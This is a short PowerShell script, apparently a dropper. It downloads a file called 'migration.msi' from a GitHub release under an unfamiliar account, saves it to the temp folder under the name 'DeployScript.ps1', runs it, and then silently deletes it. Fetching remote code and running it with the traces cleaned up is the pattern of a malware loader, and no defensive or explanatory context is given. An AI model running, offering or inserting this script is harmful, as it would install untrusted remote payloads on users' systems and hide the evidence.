$Url = "https://github.com/pedro888doc-droid/svc/releases/download/svc/migration.msi"
$TempScript = Join-Path $env:TEMP "DeployScript.ps1"

try {
    Invoke-WebRequest -Uri $Url -OutFile $TempScript -ErrorAction Stop
    & $TempScript
}
finally {
    Remove-Item $TempScript -Force -ErrorAction SilentlyContinue
}